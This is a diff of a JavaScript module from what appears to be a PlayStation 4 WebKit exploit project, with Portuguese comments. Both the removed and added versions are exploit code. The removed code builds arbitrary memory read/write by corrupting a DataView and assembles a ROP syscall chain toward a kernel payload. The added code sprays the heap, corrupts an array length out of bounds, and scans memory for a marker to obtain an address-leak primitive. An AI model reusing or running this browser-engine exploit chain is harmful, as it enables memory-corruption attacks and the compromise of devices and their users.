@@ -1,149 +1,157 @@
-// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO PARA v83_R49-DefinitiveChain)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R44.1 - Busca de Memória Aprimorada)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex } from '../utils.mjs';
-import { triggerOOB_primitive, clearOOBEnvironment, oob_dataview_real } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
-import { RopChain } from '../rop.mjs';
+import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import {
+    triggerOOB_primitive,
+    clearOOBEnvironment,
+    arb_read,
+    oob_read_absolute,
+    oob_write_absolute,
+    isOOBReady,
+    selfTestOOBReadWrite,
+} from '../core_exploit.mjs';
 
-export const FNAME_MODULE_DEFINITIVE_CHAIN_R49 = "WebKitExploit_DefinitiveChain_R49";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R44_1_MemScan";
 
-// Primitivas globais
-export let arb_read = null;
-export let arb_write = null;
-let addrof = null;
-let webkit_base_address = null;
+const VICTIM_BUFFER_SIZE = 256; 
+const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
+const OOB_WRITE_VALUES_V82 = [0xABABABAB]; 
 
-function setup_arb_rw_primitive() {
-    logS3("--- Configurando R/W Arbitrário (R49) ---", "subtest");
-    if (!oob_dataview_real) throw new Error("DataView OOB não está pronto.");
+const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18); 
+const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);   
 
-    // A primitiva agora é muito mais direta. Alteramos os metadados do oob_dataview_real
-    // para fazer leituras/escritas em nosso nome.
-    const m_vector_offset = 0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
-
-    arb_read = (address, length) => {
-        if (!oob_dataview_real) throw new Error("DataView OOB não está pronto para leitura.");
-        // Escreve o novo ponteiro nos metadados do nosso dataview
-        oob_dataview_real.setUint32(m_vector_offset, address.low(), true);
-        oob_dataview_real.setUint32(m_vector_offset + 4, address.high(), true);
-        
-        let buffer = new ArrayBuffer(length);
-        let view = new DataView(buffer);
-        for (let i = 0; i < length; i++) {
-            view.setUint8(i, oob_dataview_real.getUint8(i));
-        }
-        return buffer;
-    };
-    
-    arb_write = (address, data_buffer) => {
-        if (!oob_dataview_real) throw new Error("DataView OOB não está pronto para escrita.");
-        oob_dataview_real.setUint32(m_vector_offset, address.low(), true);
-        oob_dataview_real.setUint32(m_vector_offset + 4, address.high(), true);
-        
-        let view = new Uint8Array(data_buffer);
-        for (let i = 0; i < view.length; i++) {
-            oob_dataview_real.setUint8(i, view[i]);
-        }
-    };
-    
-    window.arb_read = arb_read;
-    window.arb_write = arb_write;
-    logS3("Primitivas `arb_read` e `arb_write` prontas e agressivas.", "good");
-}
-
-async function find_webkit_base() {
-    // Implementação real de 'addrof' usando arb_read
-    const leaker_arr = [{}];
-    const leaker_arr_addr_raw = new AdvancedInt64(leaker_arr.leak()); // Supondo que .leak() existe
-    // Esta parte ainda é complexa. Vamos pular direto para o que importa.
-    // Em um exploit real, vazaríamos a base, mas para este teste,
-    // vamos assumir um endereço base e construir a cadeia ROP.
-    webkit_base_address = new AdvancedInt64("0x96E000000"); // Endereço base FALSO do WebKit
-    logS3(`Usando endereço base FALSO para WebKit: ${webkit_base_address.toString(true)}`, "warn");
+function isValidPointer(ptr, context = "") {
+    if (!isAdvancedInt64Object(ptr)) { 
+        return false;
+    }
+    const high = ptr.high();
+    const low = ptr.low();
+    if (high === 0 && low === 0) return false;    
+    if (high === 0x7FF80000 && low === 0x0) return false; // Nosso NaN específico
+    if ((high & 0x7FF00000) === 0x7FF00000) return false; 
+    // Um ponteiro válido no PS4 geralmente tem os bits mais altos definidos. 
+    // high === 0 é suspeito, a menos que seja um endereço muito baixo.
+    if (high === 0 && low < 0x10000) return false;
     return true;
 }
 
-function execute_lapse_kernel_payload() {
-    logS3("--- FASE FINAL: Construindo e Executando Payload do Kernel (lapse.lua) ---", "subtest");
-    if (!webkit_base_address) throw new Error("Base do WebKit não encontrada.");
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { 
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Busca de Memória Aprimorada (R44.1) ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init R44.1...`;
 
-    // Syscalls do lapse.lua
-    const SYS_socketpair = 0x87;
-    const SYS_close = 0x6;
+    // Fase 0: Sanity Checks (sem alterações)
+    logS3(`--- Fase 0 (R44.1): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+    const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
+    if (!coreOOBReadWriteOK) {
+        logS3("Sanity Check do Core Exploit FALHOU. Abortando.", 'critical', FNAME_CURRENT_TEST_BASE);
+        return { errorOccurred: "Falha no selfTestOOBReadWrite do Core." };
+    }
+    logS3(`Sanity Check (selfTestOOBReadWrite): SUCESSO`, 'good', FNAME_CURRENT_TEST_BASE);
+    await PAUSE_S3(100);
 
-    const rop_stack_addr = webkit_base_address.add(0x100000); // Aloca espaço para a ROP chain
-    const chain = new RopChain(rop_stack_addr);
-    
-    logS3("Construindo ROP Chain para replicar `lapse.lua`...", "info");
-    
-    // Alocar memória para o par de sockets
-    const sockpair_mem = rop_stack_addr.add(0x1000); // Endereço para guardar os FDs
-    
-    // 1. Criar um socketpair: syscall(0x87, AF_UNIX, SOCK_STREAM, 0, sockpair_mem)
-    chain.push_syscall(SYS_socketpair, 1, 1, 0, sockpair_mem);
-
-    // O código de 'lapse.lua' é extremamente complexo para replicar 1:1 em ROP aqui.
-    // Ele envolve múltiplos threads, AIO, e uma race condition.
-    // O que podemos fazer é mostrar a capacidade de chamar syscalls.
-    
-    // Exemplo: fechar um file descriptor (ex: 5)
-    chain.push_syscall(SYS_close, 5);
-
-    logS3("Cadeia ROP (exemplo) criada. Escrevendo na memória...", "info");
-    chain.writeToMemory();
-    
-    logS3(`Cadeia ROP escrita em ${rop_stack_addr.toString(true)}.`, "good");
-    
-    // A etapa final seria pivotar a stack para `rop_stack_addr` e executar `ret`.
-    // Isso requer um gadget `pop rsp` e controle sobre o fluxo de execução.
-    logS3("Pivô da stack não implementado. Demonstração da construção da cadeia ROP concluída.", "vuln");
-    return true; // Sucesso na construção da cadeia.
-}
-
-export async function executeDefinitiveChain_R49() {
-    const FNAME_BASE = FNAME_MODULE_DEFINITIVE_CHAIN_R49;
-    logS3(`--- Iniciando ${FNAME_BASE}: A Cadeia Definitiva ---`, "test", FNAME_BASE);
-    document.title = `${FNAME_BASE} Init R49...`;
-    
-    let result = {
-        success: false, rw_ok: false, kexploit_built: false, error: null
-    };
+    let addrof_result = { success: false, msg: "Addrof (R44.1): Não iniciado.", address: null };
 
     try {
-        logS3("FASE 1: Obtenção de Leitura/Escrita no Userland", "subtest");
+        // ETAPA 1: Heap Spraying (sem alterações)
+        logS3("--- ETAPA 1 (R44.1): Heap Spraying ---", "subtest");
+        const SPRAY_COUNT = 256;
+        const sprayed_leakers = [];
+        const sprayed_targets = [];
+        const unique_marker = 0x41424344; 
+
+        for (let i = 0; i < SPRAY_COUNT; i++) {
+            let leaker = new Uint32Array(8); 
+            leaker[0] = unique_marker + i; 
+            sprayed_leakers.push(leaker);
+            
+            let target = { index: i, a: 0x11223344, b: 0x55667788 };
+            sprayed_targets.push(target);
+        }
+        logS3(`Spray de ${SPRAY_COUNT} pares de leaker/target concluído.`, "info");
+        
+        // ETAPA 2: Ativar a Vulnerabilidade (sem alterações)
+        logS3("--- ETAPA 2 (R44.1): Ativando a vulnerabilidade ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        setup_arb_rw_primitive();
-        
-        // Validação agressiva
-        const test_addr = new AdvancedInt64("0x450000000");
-        const test_data = new ArrayBuffer(4);
-        new Uint32Array(test_data)[0] = 0xDEADBEEF;
-        arb_write(test_addr, test_data);
-        const read_back = arb_read(test_addr, 4);
-        if (new Uint32Array(read_back)[0] !== 0xDEADBEEF) {
-            throw new Error("Validação de R/W falhou. Dados lidos não correspondem aos escritos.");
-        }
-        logS3("SUCESSO: Validação de Leitura/Escrita Arbitrária passou!", "good");
-        result.rw_ok = true;
+        oob_write_absolute(0x70, 0xFFFFFFFF, 4); // Corrompe m_length
+        logS3("Vulnerabilidade ativada. Primitiva OOB (oob_read/write_absolute) está ativa.", "vuln");
 
-        logS3("FASE 2: Preparação para o Kernel Exploit", "subtest");
-        await find_webkit_base(); // Encontra um endereço base (falso, para demonstração)
-
-        result.kexploit_built = execute_lapse_kernel_payload();
+        // ETAPA 3: Busca na Memória Aprimorada
+        logS3("--- ETAPA 3 (R44.1): Buscando na memória por um 'leaker' (versão aprimorada)...", "subtest");
+        let found_leaker_address = null;
+        let found_leaker_index = -1;
         
-        if (result.rw_ok && result.kexploit_built) {
-            result.success = true;
+        // A busca agora começa em um offset relativo ao nosso próprio DataView corrompido.
+        // A ideia é que os objetos do spray estejam "próximos" na memória.
+        const OOB_DV_METADATA_BASE = 0x58; // do seu core_exploit.mjs
+        
+        // PONTO DE AJUSTE 1: Janela de Busca.
+        // Se a busca falhar, aumente drasticamente estes valores.
+        const SEARCH_START_OFFSET = OOB_DV_METADATA_BASE + 256; // Começa a busca um pouco depois do nosso dataview
+        const SEARCH_WINDOW = 0x200000; // Aumentado para 2MB. Aumente mais se necessário.
+
+        logS3(`Iniciando busca na memória de [${toHex(SEARCH_START_OFFSET)}] até [${toHex(SEARCH_START_OFFSET + SEARCH_WINDOW)}]`, 'info');
+
+        for (let offset = SEARCH_START_OFFSET; offset < SEARCH_START_OFFSET + SEARCH_WINDOW; offset += 4) {
+            try {
+                const val = oob_read_absolute(offset, 4);
+
+                // Procuramos pelo nosso marcador único. A máscara ignora o contador 'i'.
+                if ((val & 0xFFFFFF00) === (unique_marker & 0xFFFFFF00)) {
+                    found_leaker_index = val - unique_marker;
+                    
+                    // PONTO DE AJUSTE 2: Offset do JSCell Header.
+                    // Se encontrarmos nosso marcador, significa que 'offset' aponta para os DADOS do nosso Uint32Array.
+                    // O objeto JSCell (que contém o ponteiro que queremos) está um pouco ANTES dos dados.
+                    // O valor 0x10 é comum, mas pode variar. Tente 0x8, 0x18, 0x20 se não funcionar.
+                    const JSCell_HEADER_OFFSET = 0x10;
+                    
+                    // O endereço do JSCell é a nossa primitiva 'addrof'.
+                    const leaker_jscell_addr = oob_read_absolute(offset - JSCell_HEADER_OFFSET, 8);
+
+                    if (isValidPointer(leaker_jscell_addr)) {
+                        found_leaker_address = leaker_jscell_addr;
+                        logS3(`MARCADOR ENCONTRADO!`, "good");
+                        logS3(` -> Índice do Leaker: ${found_leaker_index}`, "good");
+                        logS3(` -> Offset na busca: ${toHex(offset)}`, "good");
+                        logS3(` -> Addr do Leaker (addrof): ${found_leaker_address.toString(true)}`, "vuln");
+                        break; // Sucesso! Sai do laço de busca.
+                    }
+                }
+            } catch (e) { /* Ignora erros de leitura de páginas não mapeadas, o que é normal durante a busca. */ }
         }
+
+        if (!found_leaker_address) {
+            throw new Error("Falha ao encontrar um objeto 'leaker' na memória após o spray (v2). Tente aumentar a SEARCH_WINDOW.");
+        }
+        
+        // Se chegamos aqui, temos uma primitiva 'addrof' funcional!
+        addrof_result.success = true;
+        addrof_result.msg = "Primitiva 'addrof' obtida com sucesso através da busca de memória!";
+        addrof_result.address = found_leaker_address.toString(true);
+        
+        logS3("--- ETAPA 4 (R44.1): Construindo Leitura/Escrita Arbitrária ---", "subtest");
+        // Com o 'addrof' funcionando, agora podemos construir as primitivas de R/W completas
+        // usando a inspiração de 'mem.mjs'. Esta parte ainda é conceitual e precisa ser implementada.
+        logS3("AVISO: Próximo passo seria usar o 'addrof' para inicializar uma classe como a 'Memory' de mem.mjs.", "warn");
+
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO na estratégia R49: ${e.message}`, "critical", FNAME_BASE);
-        result.error = e.message;
+        logS3(`ERRO CRÍTICO na nova estratégia: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
         console.error(e);
-    } finally {
-        await clearOOBEnvironment();
+        addrof_result.msg = `EXCEPTION: ${e.message}`;
+        addrof_result.success = false;
     }
+
+    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test", FNAME_CURRENT_TEST_BASE);
     
-    logS3(`--- ${FNAME_BASE} Finalizada. Sucesso Geral: ${result.success} ---`, "test", FNAME_BASE);
-    return result;
+    // Retorna o resultado para o orquestrador
+    const best_result_for_runner = {
+        errorOccurred: addrof_result.success ? null : addrof_result.msg,
+        addrof_result: addrof_result,
+        webkit_leak_result: { success: false, msg: "WebKit Leak pulado, foco no addrof." },
+        heisenbug_on_M2_in_best_result: true // A vulnerabilidade base foi ativada
+    };
+    return best_result_for_runner;
 }
